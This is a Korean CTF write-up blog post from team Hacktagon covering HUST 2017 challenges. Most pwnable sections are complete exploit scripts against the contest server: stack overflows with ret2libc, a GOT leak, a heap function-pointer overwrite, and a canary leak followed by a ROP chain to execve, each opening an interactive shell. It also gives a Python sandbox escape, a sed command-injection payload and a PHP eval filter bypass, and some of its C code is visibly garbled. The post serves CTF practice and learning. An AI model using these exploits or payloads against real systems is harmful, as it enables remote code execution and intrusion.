---
layout: post
title:  "제 15회 HUST Hacking Festival"
tag:   CTF, Write-up
categories: CTF
modified: 2017-06-03
comments: true
featured: true
---

# Team _*Hacktagon*_ HUST 2017 Write-up


## 0x00 대회 최종 결과
<img src="{{ site.url }}/images/persu/rank.png" style="display: block; margin: auto;">

| no  | 분야  | 제목  | 배점  | Solve|  
|:-:|:-:|:-:|:-:|:-:|
| No.1   | Event      | MIC1  | 1 |O|
| No.2   | Crypto     | Maware Maware Maware  | 50 |X|
| No.3   | Mobile     | Trouble Maker  | 100 |X|
| No.4   | Pwnable    | RR2L  | 50  |O|
| No.5   | Pwnable    | wind  | 100 |O|
| No.6   | prog       | Catch JACK If you can | 50 |O|
| No.7   | MISC       | Treasurehunt  | 50 |X|
| No.8   | Mobile     | STAGE-UP  | 100 |O|
| No.9   | Pwnable    | OH MY BOF  | 100 |O|
| No.10  | Crypto     | Hill  | 100 |O|
| No.11  | Web        | The Wandering Man  | 100 |X|
| No.12  | Web        | Can You find It?  | 50 |O|
| No.13  | Reversing  | shambles  | 300 |O|
| No.14  | Pwnable    | Do It Your Heap Ex  | 100 |O|
| No.15  | Web        | Fireworks  | 200 |X|
| No.16  | Prog       | ML_Quiz | 0-130 |O|
| No.17  | Prog       | iamrandom | 50 |O|
| No.18  | Reversing  | Mystic_Crypt_9903 | 150 |X|
| No.19  | Pwnable    | earth | 100 |O|
| No.20  | Web        | The Resurrection | 300 |X|
| No.21  | MISC       | Python Playground | 50 |O|
| No.22  | Reversing  | Mind Control | 200 |X|
| No.23  | Pwnable    | Withdraw | 200 |O|
| No.24  | Prog       | Follow the trend | 200 |X|
| No.25  | Event      | MIC2 | 1 |O|
| No.26  | Pwnable    | shellwedance? | 300 |O|
| No.27  | Web        | bypass_filter | 200 |O|

## 0x01 Event MIC1 [1]
- 생존확인. 췍췍

## 0x04 Pwnable RR2L [50]
- 문제 제공 파일로 바이너리랑 libc를 제공해준다.
- 취약점은 딱 봐도 bof취약점이 보인다.
- write_plt + write_got를 이용하여 write libc 주소구하고 제공해주는 libc에서 system libc와 "/bin/sh\x00" 찾아서 슥삭하면 됩니다.

```python
# libc offset
from pwn import *

libc = ELF("libc-2.23.so")

offset = libc.symbols['write'] - libc.symbols['system']
print hex(libc.symbols['write'])
print hex(libc.symbols['system'])
print hex(offset)
print libc.symbols['write'] - next(libc.search("/bin/sh\x00"))
```

```python
# Exploit
from pwn import *

s = remote('223.194.105.182', 37100)
print s.recvuntil('Press any thing\n')

main = 0x0804852B
write_plt = 0x08048410
write_got = 0x0804A024
system_offset = 0x9AC50
binsh_offset = 548411

payload = "a"*104 # stack dummy
payload += p32(write_plt)
payload += p32(main)
payload += p32(1) # fd
payload += p32(write_got) # buf
payload += p32(4) # len

s.sendline(payload)
s.recv(1024)
leak_addr = u32(s.recv(4))
system_addr = leak_addr - system_offset
binsh = leak_addr + binsh_offset

print s.recvuntil('Press any thing\n')
payload2 = "a"*104 # stack dummy
payload2 += p32(system_addr)
payload2 += p32(0x61616161)
payload2 += p32(binsh)
s.sendline(payload2)

s.recv(1024)
s.interactive()
```

## 0x05 Pwnable wind [100]
- 문제의 컨셉을 파악하기도 전에 취약점이 보여서 그냥 해봤는데... 됐어요.
- 쉘을 제공해주는 코드가 있었기 때문에 eip를 컨트롤할 수 있는 상황에서 해당 코드로 eip를 변조하였음.

```python
import socket
from struct import *

p32 = lambda x:pack("<L",x)
host = "223.194.105.182"
port = 22901

def until(msg):
	data = ''
	while True:
		data += s.recv(1)
		if msg in data:
			return data

s = socket.socket()
s.connect((host, port))

print until("It's for my baby!")

shell_addr = 0x080483DB
payload = "a" * 32
payload += p32(shell_addr)

until("[+] TYPING THIS: ")
r_str = s.recv(1)
until("[+] INPUT: ")
s.send(payload + "\n")
r_msg = s.recv(1024)

while True:
	cmd = raw_input("> ")
	s.send(cmd + "\n")
	print s.recv(1024)
```

## 0x06 prog Catch JACK If you can [50]
- 딜러가 항상 올바른 선택을 하지 않음.
- 내 카드 총합이 15가 넘지 않을때 카드를 받는게 승률이 높다는것을 테스트로 확인함.
- 코드를 돌려놓으니 키를 획득.

```python
import socket

while True :
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = ('223.194.105.182', 28345)
        sock.connect(server_address)

        recvdata = sock.recv(10000)
        recvdata = sock.recv(10000)
        print recvdata

        while True:
                money = recvdata.split('~')
                money = mony[1].split(')')

                if int(money[0]) < 30000:
                        break;
                senddata = str(money[0])+'\n'
                sock.send(senddata)

                recvdata = sock.recv(10000)
                print recvdata

                recvdata = sock.recv(10000)
                print recvdata

                while True:
                        a = recvdata.split('core : ')
                        b = a[1].split('\r\n');
                        if int(b[0]) > 15:
                                data = 2
                        else :
                                data = 1

                        senddata = str(data)+'\n'
                        sock.send(senddata)

                        recvdata = sock.recv(10000)
                        print recvdata
                        recvdata = sock.recv(10000)
                        print recvdata

                        if data == 2:
                                break;

        sock.close()
```

## 0x08 Mobile STAGE-UP [100]
Stage1 key 값은 APK 해제 후 생기는 class 파일을 분석하면 알 수 있다.

stage1.class
```java
package com.cinnamon.moon.hackingproblem.util;

public class Stage1
{
  private String key1 = "SFUzN19IRjIwMT";

  public String getKey1()
  {
    return this.key1;
  }
}
```

Stage2 key 값은 lib 디렉토리에 존재하는 stage2.so 파일 내 존재한다.

libStage2.so
```
.text:00000470                 public Java_com_cinnamon_moon_hackingproblem_util_Stage2_getKey2
.text:00000470 Java_com_cinnamon_moon_hackingproblem_util_Stage2_getKey2 proc near
.text:00000470
.text:00000470 arg_0           = dword ptr  8
.text:00000470
.text:00000470                 push    ebp
.text:00000471                 mov     ebp, esp
.text:00000473                 push    ebx
.text:00000474                 push    edi
.text:00000475                 push    esi
.text:00000476                 and     esp, 0FFFFFFF0h
.text:00000479                 sub     esp, 410h
.text:0000047F                 call    $+5
.text:00000484                 pop     ebx
.text:00000485                 add     ebx, 1B60h
.text:0000048B                 mov     esi, [ebp+arg_0]
.text:0000048E                 mov     eax, large gs:14h
.text:00000494                 mov     [esp+408h], eax
.text:0000049B                 sub     esp, 4
.text:0000049E                 lea     eax, (aD7d2xybmf1zmfr - 1FE4h)[ebx] ; "d7d2xybmF1ZmFrZ"
.text:000004A4                 lea     edi, [esp+0Ch]
.text:000004A8                 push    400h            ; n
.text:000004AD                 push    eax             ; src
.text:000004AE                 push    edi             ; dest
.text:000004AF                 call    _memcpy
```

stage3 key 값은
stage3 activity에서 아래와 같이 동작한다.

```java
protected void onCreate(Bundle paramBundle)
{
	super.onCreate(paramBundle);
	setContentView(2130968604);
	paramBundle = getIntent();
	this.textView = ((TextView)findViewById(2131427415));
	this.key = ((TextView)findViewById(2131427416));
	this.key.setText(paramBundle.getStringExtra("key"));
	this.pgmt = new PGMT();
	this.pgmt.start();
}
}
```

PGMT 라이브러리에는 특정 IP에 접근하여, key 값을 받아오게 된다.

```
.text:00000550                 public Java_com_cinnamon_moon_hackingproblem_util_PleaseGiveMe_PGM
.text:00000550 Java_com_cinnamon_moon_hackingproblem_util_PleaseGiveMe_PGM proc near
.text:00000550
.text:00000550 arg_0           = dword ptr  8
.text:00000550
.text:00000550                 push    ebp
.text:00000551                 mov     ebp, esp
.text:00000553                 push    ebx
.text:00000554                 push    esi
.text:00000555                 and     esp, 0FFFFFFF0h
.text:00000558                 sub     esp, 420h
.text:0000055E                 call    $+5
.text:00000563                 pop     ebx
.text:00000564                 add     ebx, 1A71h
.text:0000056A                 mov     eax, large gs:14h
.text:00000570                 mov     [esp+41Ch], eax
.text:00000577                 sub     esp, 4
.text:0000057A                 push    0               ; protocol
.text:0000057C                 push    1               ; type
.text:0000057E                 push    2               ; domain
.text:00000580                 call    _socket
.text:00000585                 add     esp, 10h
.text:00000588                 mov     esi, eax
.text:0000058A                 sub     esp, 0Ch
.text:0000058D                 lea     eax, (a223_194_105_18 - 1FD4h)[ebx] ; "223.194.105.182"
.text:00000593                 push    eax             ; cp
.text:00000594                 call    _inet_addr
.text:00000599                 add     esp, 10h
.text:0000059C                 mov     [esp+40Ch], eax
.text:000005A3                 mov     dword ptr [esp+408h], 147A0002h
.text:000005AE                 sub     esp, 4
.text:000005B1                 lea     eax, [esp+40Ch]
.text:000005B8                 push    10h             ; len
.text:000005BA                 push    eax             ; addr
.text:000005BB                 push    esi             ; fd
```

이후 각 stage에서 얻어온 key값을 합친 이후 base64 디코딩을 하게 되면 flag값을 확인 할 수 있다.


## 0x09 Pwnable OH MY BOF [100]
- 이번에도 bof 네요.
- bof는 쉽게 터지는데 쓸만한 곳이 없네요.
- got 에서 libc_start_main 라이브러리 주소 릭을 할수 있음
- Strings 해보면 컴파일 정보에서 Ubuntu 16.04.4 정보 나와있음.
- Ubuntu 16.04.4 에서 라이브러리 가지고 오프셋 구해서 슥삭하면되네요.

```python
import socket
from struct import *

p32 = lambda x:pack("<L",x)
up32 = lambda x:unpack("<L",x)[0]
host = "223.194.105.182"
port = 41001

def until(msg):
        data = ''
        while True:
                data += s.recv(1)
                if msg in data:
                        return data

s = socket.socket()
s.connect((host, port))
print until("attack:")

write = 0x080483E3
ppppr = 0x8048488
pr = 0x080482ad
add_ret = 0x080483a8
syscall = 0x080483FB

payload = "a" * 24
payload += p32(write)
payload += p32(0x0804a000)
s.send(payload)
print repr(s.recv(1024))

leak = s.recv(1024)
print repr(leak)
libc_start_main = up32(leak[12:16])
print hex(libc_start_main)

libc_base = libc_start_main - 0x18540 # It's Okay !
binsh = libc_start_main + 0x1432eb
system = libc_start_main + 0x22860

payload2 = "a" * 24
payload2 += p32(system)
payload2 += p32(0)
payload2 += p32(binsh)
s.send(payload2)

while True:
	cmd = raw_input(">")
	s.send(cmd + "\n")
	print s.recv(1024)
```

## 0x0A Crypto Hill [100]
- 16글자를 입력받아 4X4 matrix 에 저장하고 count 번 만큼
$$
\left(\begin{array}{cc}
2 & 5 & 18 & 5\\
16 & 7 & 8 & 9\\
10 & 11 & 14 & 4\\
2 & 15 & 11 & 17
\end{array}\right)
$$
을 곱한다음 결과 값을 출력하는데
15개를 출력한 뒤 4번째 값 + count를 출력하고 16번째 값을 출력하고 0을 출력한다

즉 문제에서 나온 암호 파일
```
164845022
194846903
258237904
166782954
210425942
249349389
330056130
213716910
196223440
232924323
307918857
199897032
173490804
205813716
272275442
166782958
176726624
0
```

에서 4번째 값과 16번째 값을 비교하면 count가 4임을 알 수있다.

원문 matrix * (암호화 matrix^4) = (암호문 matrix)

의 수식을 풀면 원문을 얻을 수 있다.

``` c
#include<stdio.h>

long long AM[4][4] = {{ 164845022, 194846903, 258237904, 166782954 }, { 210425942, 249349389, 330056130, 213716910 }, { 196223440, 232924323, 307918857, 199897032 }, { 173490804, 205813716, 272275442, 176726624 }};
long long D[4][4] = { {-459, 1761, 258, -858}, {-2546, -2118, 3698, 1000}, {2050, -84, -172, -518}, {974, 1716, -3182, 1208} };
long long C[4][4];

int main(void)
{
   int i, j, k, l;
   for (l = 0; l < 4; l++)
   {
      for (i = 0; i < 4; i++)
      {
         for (j = 0; j < 4; j++)
         {
            for (k = 0; k < 4; k++)
               C[i][j] += AM[i][k] * D[k][j];
         }
      }

      for (i = 0; i < 4; i++)
      {
         for (j = 0; j < 4; j++)
            C[i][j] /= 28122LL;
      }

      for (i = 0; i < 4; i++)
      {
         for (j = 0; j < 4; j++)
         {
            AM[i][j] = C[i][j];
            C[i][j] = 0;

            printf("%llx ", AM[i][j]);
         }
         printf("\n");
      }
   }

   for (i = 0; i < 4; i++)
   {
      for (j = 0; j < 4; j++)
         printf("%c",(char)AM[i][j]);
   }
}
```

flag : @hy@usolveMypr0b

## 0x0C Web	Can You find It? [50]
- robots.txt 규정을 준수합시다.

## 0x0D Reversing shambles [300]
- argv로 16진수 두자리 숫자를 입력받아서 각각 어떤 함수를 통과시킨 다음 결과 값이 맞아야 다음으로 진행이 되는 구문이 있어 그 답을 알아내도록 프로그램을 작성해서 cipher key를 알아냈다.

``` c
#include <stdio.h>

int sub_401260(int a1)
{
  int v2;
  v2 = 5*(((a1<<15)+~a1)^(((a1<<15)+~a1)>>12));
  return (2057*(v2^(v2>>4))^(2057*(v2^(v2>>4))>>16))%1024;
}

int sub_401160(int a1)
{
  int v1;
  int v3;
  int v4;

  v3 = (a1+~(a1<<31))^((a1+~(a1<<31))>>22);
  v4 = 9*((v3+~(v3<<13))^((v3+~(v3<<13))>>8));
  v1 = (v4^(v4>>15))+~((v4^(v4>>15))<<27);
  return (v1^(v1>>31))%1024;
}

unsigned int sub_401100(int a1)
{
  unsigned int v2;//[esp+8h][ebp+8h]@1
  unsigned int v3;//[esp+8h][ebp+8h]@1

  v2 = 9*((a1+~(a1<<15))^((unsignedint )(a1+~(a1<<15))>>10));
  v3 = (v2^(v2>>6))+~((v2^(v2>>6))<<11);
  return (v3^(v3>>16))%0x400;
}

unsigned int sub_4011E0(int a1)
{
  unsignedint v2;//[esp+8h][ebp+8h]@1
  unsignedint v3;//[esp+8h][ebp+8h]@1

  v2 = 17*(4097*a1^((unsignedint )(4097*a1)>>22));
  v3 = 129*(1025*(v2^(v2>>9))^(1025*(v2^(v2>>9))>>2));
  return (v3^(v3>>12))%0x400;
}

int sub_4012C0(int a1)
{
  int v1;//edx@1

  v1 = 9*((a1>>16)^a1^0x3D)^(9*((a1>>16)^a1^0x3D)>>4);
  return (668265261*v1^(668265261*v1>>15))%1024;
}

int main(void)
{
  int i;
  for(i = 0;i<256;i++)
  {
    if(sub_401260(i) =  = 988)
      print f("1%02x\n",i);
  }
  for(i = 0;i<256;i++)
  {
    if(sub_401160(i) =  = 637)
      print f("2%02x\n",i);
  }
  for(i = 0;i<256;i++)
  {
    if(sub_401100(i) =  = 646)
      print f("3%02x\n",i);
  }

  for(i = 0;i<256;i++)
  {
    if(sub_4011E0(i) =  = 828)
      print f("4%02x\n",i);
  }

  for(i = 0;i<256;i++)
  {
    if(sub_4012C0(i) =  = 240)
      print f("5%02x\n",i);
  }

  for(i = 0;i<256;i++)
  {
    if(sub_4011E0(i) =  = 23)
      print f("6%02x\n",i);
  }
  for(i = 0;i<256;i++)
  {
    if(sub_4012C0(i) =  = 771)
      print f("7%02x\n",i);
  }
  for(i = 0;i<256;i++)
  {
    if(sub_401260(i) =  = 658)
      print f("8%02x\n",i);
  }
  for(i = 0;i<256;i++)
  {
    if(sub_401100(i) =  = 1012)
      print f("9%02x\n",i);
  }
  for(i = 0;i<256;i++)
  {
    if(sub_401160(i) =  = 38)
      print f("10%02x\n",i);
  }
}
```

이 프로그램을 실행 시킨 결과를 shambles 파일에 넣었더니 다음과 같은 결과를 얻을 수 있었다.

``` bash
shambles.exe 68 40 70 70 31 6e 33 73 73 21
valid!!
cipher key is : h@pp1n3ss!
```

하지만 얻을 수 있는게 없었고 이 루틴에서 파일의 경로를 얻어와서 파일을 하나 출력해주는 것을 알 수 있었고 Ollydbg를 이용해 동적 디버깅해보니 C:\\Users\\XX\\AppData\\Local\\Temp 폴더에 FLAGKEY.decrypted.png 라는 이름으로 플래그를 출력해주었다.

FLAG : HU37_HF2017{Do_U_1ike_p0nce_p1ugin_of_ida}

## 0x0E Pwnable Do It Your Heap Ex [100]
- Stack Bof 아닌 문제가 나와서 기뻣는데 그 기쁨도 잠시....
- malloc 이후 해당 힙 영역에 함수 포인터를 지정한 후 사용하는데, 해당 범위까지 접근이 가능하여 함수 포인터를 덮을 수 있음.

```python
import socket
from struct import *

p32 = lambda x:pack("<L",x)
host = "223.194.105.182"
port = 29001

def until(msg):
	data = ''
	while True:
		data += s.recv(1)
		if msg in data:
			return data

s = socket.socket()
s.connect((host, port))

print until("First, Input anythings :")

shell_addr = 0x08048980
payload = "a" * 400
payload += p32(shell_addr)

s.send(payload + "\n")
r_msg = s.recv(1024)
print r_msg

while True:
	cmd = raw_input("> ")
	s.send(cmd + "\n")
	print s.recv(1024)
```

## 0x10 Prog ML_Quiz [0-130]
Google search를 통해 각 문제를 풀 수 있었음.
해당 문제에서 100점을 획득하였음

## 0x11 Prog iamrandom [50]
- 수식이 ((((숫자 연산 숫자) 연산 숫자) 연산 숫자) 연산 숫자) [연산 숫자] 형태로 구성되어있음을 이용해서 간단히 해결
- C에서 32비트 숫자를 유지하고 MSB가 부호 비트인것을 유지해줌
- / 연산이 강제로 int로 형변환되고 음수 / 양수를 따로 처리
- 쉬프트 연산의 Operand2가 32보다 클 경우 32로 나눈 나머지만큼만 연산

``` python
MOD = 1<<32
SIG = 1<<31

def getint(express):
   cnt = 0
   while True:
      if cnt == len(express):
         return int(express), ""
      if ord('0') <= ord(express[cnt]) <= ord('9'):
         cnt = cnt+1
      else:
         break

   return int(express[:cnt]), express[cnt:]

def getOP(express):
   if express[0] == '+':
      return '+', express[1:]
   elif express[0] == '-':
      return '-', express[1:]
   elif express[0] == '/':
      return '/', express[1:]
   elif express[0] == '*':
      return '*', express[1:]
   elif express[0] == '>':
      return '>', express[2:]
   elif express[0] == '<':
      return '<', express[2:]


def calc(express):
   express = express.replace('(', '')

   A, express = getint(express)

   while True:
      op, express = getOP(express)
      B, express = getint(express)

      print A, op, B, "->",

      if op == '+':
         A = A + B
      elif op == '-':
         A = A - B
      elif op == '/':
         if A>=0:
            A = A // B
         else:
            A = -((-A) // B)
      elif op == '*':
         A *= B
      elif op == '>':
         B %= 32
         A >>= B
      elif op == '<':
         B %= 32
         A <<= B

      A %= MOD
      if A>=SIG:
         A-=MOD

      print A
      express = express[1:]

      if express == "":
         break

   return A



import socket
from struct import *

p32 = lambda x:pack("<L",x)
up32 = lambda x:unpack("<L",x)[0]
host = "223.194.105.182"
port = 22902

def until(msg):
        data = ''
        while True:
                data += s.recv(1)
                if msg in data and '.' in data:
                        return data

s = socket.socket()
s.connect((host, port))

for i in range(30):
   msg = until("0000")
   print msg
   for i in msg.split('\n'):
      if "Problem:" in i:
         problem = i.split()[2]
   print "\nProblem is : " + problem + "!!"
   ans = str(calc(problem)) + '\n'
   print "ANS : " + ans
   s.send(ans)

for i in range(10):
   print s.recv(1024)

s.close()
```

## 0x13 Pwnable earth [100]
- got 영역 릭을 통해 라이브러리 주소를 구해왔는데...네. 주소가 고정이였어요.
- system 함수와 /bin/sh를 통해 쉘을 실행시켰는데...연결은 유지되어있는거 같은데 명령어 결과가 출력이 안되길래..시스템 함수의 eip를 aaaa 로 덮고 에러메시지가 출력되는 것을 확인하기 위해 exit시키니 이후에 정상적으로 쉘을 획득할 수 있엇습니다.
- 쉘 획득 후 서버 내에 server.py 를 확인해보니... 뒷 부분에서 디버거가 붙어서 주소가 고정되어 있었던 것을 확인할 수 있었습니다.

```python
import socket
from struct import *

p32 = lambda x:pack("<L",x)
up32 = lambda x:unpack("<L",x)[0]

host = "223.194.105.182"
port = 22900

def until(msg):
	data = ''
	while True:
		data += s.recv(1)
		if msg in data:
			return data

s = socket.socket()
s.connect((host, port))

print until("]")

system_libc = 0xB7E54310
binsh_libc = 0xb7f76bac

stack = 0xbffff46c
print_addr = 0x080484D8
print_got = 0x0804A00C

payload =  "a" * (112)
#payload += p32(print_addr)
payload += p32(system_libc)
payload += p32(0x61616161)
payload += p32(binsh_libc)

s.send(payload + "\n")

r_msg = s.recv(1024)
#print repr(r_msg)
#print repr(s.recv(4096))
#until("Usage: ")
#print "[Leak]---"
#leak = s.recv(4096)
#print repr(leak)
#printf_libc = up32(leak[0:4])
#strcpy_libc = up32(leak[4:8])
#print  "[*] printf Libc : " + hex(printf_libc)
#print  "[*] strcpy Libc : " + hex(strcpy_libc)

while True:
	cmd = raw_input("> ")
	s.send(cmd + "\n")
	print s.recv(4096)
```

## 0x15 MISC Python Playground [50]
- 파이썬 이스케이프 같은 문제였는데.. 특별한 필터링이 없어서  os 모듈을 가져와서 시스템 명령어를 실행하였습니다.

```python
__builtins__.__import__("os").system("ls -al;cat flag")
```

## 0x17 Pwnable Withdraw [200]
- 스트립...스태틱 컴파일...네... ㅠㅠ
- 스택 까나리가 걸려 있어서 그냥 공격은 할 수 없지만 릭이 되는 곳이 있어서 릭으로 까나리를 구할 수 있었음다.
- 쓸만한 가젯이 많아서 쉽게 ROP 할수 있었슴니다!

```python
import socket
from struct import *

p32 = lambda x:pack("<L",x)
up32 = lambda x:unpack("<L",x)[0]
host = "223.194.105.182"
port = 35159

def until(msg):
        data = ''
        while True:
                data += s.recv(1)
                if msg in data:
                        return data

def menu():
	until("Input number : ")

def canary_leak():
	menu()
	s.send("2\n")
	until("Do you have id code?(y/n)")
	s.send("y\n")
	until("Register your id code.\n")
	leak_i = "a" * 65
	s.send(leak_i)
	leak = s.recv(100)
	print repr(leak)
	canary = up32("\x00" + leak[69:72])
	return canary

def r_exit():
	menu()
	s.send("2\n")
	until("Do you have id code?(y/n)")
	s.send("a\n")

s = socket.socket()
s.connect((host, port))

'''
sys_read
eax = 0x3
ebx = fd
ecx = buf
edx = size

sys_write
eax = 0x4
ebx = fd
ecx = buf
edx = size

sys_execve
eax = 0xb
ebx = /bin/sh\x00
ecx = 0x0
edx = 0x0
esi = 0x0
'''

syscall = 0x0806F870
pop_eax_ret = 0x08048882
pppppr = 0x08098904
pppr = 0x0806f280
bss = 0x080ECD84
'''
0x0806f870 : int 0x80 ; ret
0x0806ce55 : int 0x80
0x08098904 : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0806f280 : pop edx ; pop ecx ; pop ebx ; ret
'''

canary = canary_leak()
print "[*] Canary : " + hex(canary)
menu()
s.send("2\n")
until("Do you have id code?(y/n)")
s.send("y\n")
until("Register your id code.\n")
payload = "\x00" * 64
payload += p32(canary) * 1
payload += p32(0x08048A45) # ebp
payload += p32(pppr) # edx, ecx, ebx
payload += p32(0x10) # edx == size
payload += p32(bss) # ecx == buf
payload += p32(0x0) # ebx == stdin
payload += p32(pop_eax_ret)
payload += p32(0x3) # eax = 0x3
payload += p32(syscall)
payload += p32(pppr) # edx, ecx, ebx
payload += p32(0x0) # edx
payload += p32(0x0) # ecx
payload += p32(bss) # ebx
payload += p32(pop_eax_ret)
payload += p32(0xb) # eax = 0xb
payload += p32(syscall)
#payload += p32(pop_eax_ret)
#payload += p32(0x4)
#payload += p32(syscall)

print "[*] len(Payload) : " + str(len(payload))
s.send(payload)
r_exit()
print repr(s.recv(1024))
s.send("/bin/sh\x00")

while True:
	cmd = raw_input(">")
	s.send(cmd + "\n")
	print s.recv(1024)
```

## 0x19 Event MIC2 [1]
- 중간 생존 확인. 췍췍

## 0x1A Pwnable shellwedance? [300]
- 플래그 파일과 sed, awd 등을 이용하여 플래그 파일과 비교하는 그런거 문제인거 같은데..
- 2번 메뉴에 필터링이 안걸려 있네요...

```
root@ubuntu:/home/hust# ./shellwedance
Hello :D - Learning Data Parser
--------------------------
shellwedance
--------------------------

select option
1. original data
2. sed(include)
3. sed(exclude)
4. sed&awk(conditional)
5. sed&awk(average)
6. awk(pattern&action)
7. exit
2
sed - Include Keyword:
'| id ; cat flag #'
sed -n '/'| id ; cat flag #'/p' ./yeast.data
uid=0(root) gid=0(root) groups=0(root)
sed: -e expression #1, char 1: unterminated address regex
cat: flag: No such file or directory

select option
1. original data
2. sed(include)
3. sed(exclude)
```

## 0x1B Web bypass_filter [200]
- eval 함수 취약점
- 필터링이 이상하네요. 슥삭~

```
content=files_imgfiles1{function i(){return `ls -al`;}}/*
```
